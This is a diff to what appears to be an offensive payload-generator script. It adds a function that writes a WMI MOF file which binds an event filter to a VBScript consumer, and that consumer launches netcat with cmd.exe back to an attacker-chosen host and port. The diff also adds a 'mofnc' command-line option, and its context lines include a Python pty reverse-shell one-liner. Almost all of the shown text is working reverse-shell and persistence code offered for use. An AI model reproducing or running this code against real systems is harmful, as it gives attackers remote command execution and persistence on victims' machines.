@@ -287,6 +287,84 @@ func main() {
     os.system('go build -o ./mysql_x64 /tmp/mysql_x64.go')
 
 
+def build_mof(lhost, lport):
+    mof_skeleton = """#pragma namespace ("\\\\\\\\.\\\\Root\\\\cimv2")
+
+    class MSClassConsumer71
+    {
+      [key] string Name;
+    };
+
+    class ActiveScriptEventConsumer : __EventConsumer
+    {
+      [key] string Name;
+      [not_null] string ScriptingEngine;
+      [Template] string ScriptText;
+      string ScriptFilename;
+      uint32 KillTimeout = 0;
+    };
+
+    instance of __Win32Provider as $P
+    {
+      Name = "ActiveScriptEventConsumer";
+      Clsid = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
+      PerUserInitialization = TRUE;
+    };
+
+    instance of __EventConsumerProviderRegistration
+    {
+      Provider = $P;
+      ConsumerClassNames = {"ActiveScriptEventConsumer"};
+    };
+
+    instance of ActiveScriptEventConsumer as $Cons
+    {
+      Name = "ACEVNTBX";
+      ScriptingEngine = "VBScript";
+      ScriptText = "Set objShell = CreateObject(\\"WScript.Shell\\")\\n"
+      "objShell.Run \\"C:\\\\Windows\\\\system32\\\\cmd.exe /C C:\\\\Windows\\\\system32\\\\nc.exe ###LHOST### ###LPORT### -e C:\\\\Windows\\\\system32\\\\cmd.exe\\"\\n";
+    };
+
+    instance of __EventFilter as $Filt
+    {
+      Name = "IEFLTKC";
+      Query = "SELECT * FROM __InstanceCreationEvent"
+        " WHERE TargetInstance.__class = \\"MSClassConsumer71\\"";
+      QueryLanguage = "WQL";
+    };
+
+    instance of __FilterToConsumerBinding as $bind
+    {
+        Filter = $Filt;
+        Consumer = $Cons;
+    };
+
+
+    instance of MSClassConsumer71 as $myclass
+    {
+      Name = "ClassConsumer81";
+    };"""
+
+    mof_name = 'payload.mof'
+    print('[+] Generating {}'.format(mof_name))
+
+    mof_filled = mof_skeleton.replace('###LHOST###', lhost)
+    mof_filled = mof_filled.replace('###LPORT###', lport)
+
+    mof_lfile_path = './{}'.format(mof_name)
+    try:
+        with open(mof_lfile_path, 'w') as mof_file:
+            mof_file.write(mof_filled)
+    except IOError as e:
+        print('[-] An error occured while writing the mof file. Printing exception and exiting...')
+        print(e)
+        sys.exit(1)
+
+    return mof_name
+
+
+
+
 def python_reverse_shell(lhost,lport, ver=''):
     python_rev_shell = '''python%s -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
   s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (ver, lhost, lport)
@@ -311,6 +389,7 @@ Simplifies payload creation and listener.
     lin64    <LHOST> <LPORT>  |   x64 Linux payload
     lin32    <LHOST> <LPORT>  |   x32 Linux payload
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
+    mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
@@ -468,6 +547,10 @@ if __name__ == '__main__':
 
     if type == 'mysql64':
         build_mysql_payload(lhost, lport)
+        sys.exit(0)
+
+    if type == 'mofnc':
+        build_mof(lhost, lport)
         sys.exit(0)
 
     if type[-1] == 's':
